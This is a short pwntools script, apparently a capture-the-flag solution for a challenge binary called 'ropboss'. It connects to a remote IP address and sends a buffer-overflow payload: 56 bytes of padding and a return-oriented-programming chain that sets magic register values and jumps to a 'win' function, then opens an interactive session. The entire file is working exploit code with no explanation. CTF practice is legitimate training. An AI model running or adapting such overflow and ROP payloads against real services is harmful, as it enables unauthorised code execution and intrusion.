from pwn import *

# p = process("./ropboss")
p=remote("3.101.12.127",5003)

win = 0x00000000040126d
rdi = 0x0000000000401423
rsi_r15 = 0x0000000000401421
rdx_rdi_rbp = 0x0000000000401267
rcx_rsi_rbp = 0x00000000004012d4
ret=0x000000000040101a

payload = b'a'*56 + p64(rdi) + p64(0xbabecafe) + p64(rdx_rdi_rbp)+ p64(0x0) + p64(rsi_r15) + p64(0xd00df00d)+ p64(0x0)  + p64(rcx_rsi_rbp)+ p64(0x0)+ p64(rsi_r15) + p64(0xcafebabe) + p64(0x0) + p64(ret) + p64(rdi) + p64(0xdeadbeef) + p64(win)

p.recvline()
p.sendline(b"yes")
p.recvline()
p.sendline(payload)
p.interactive()
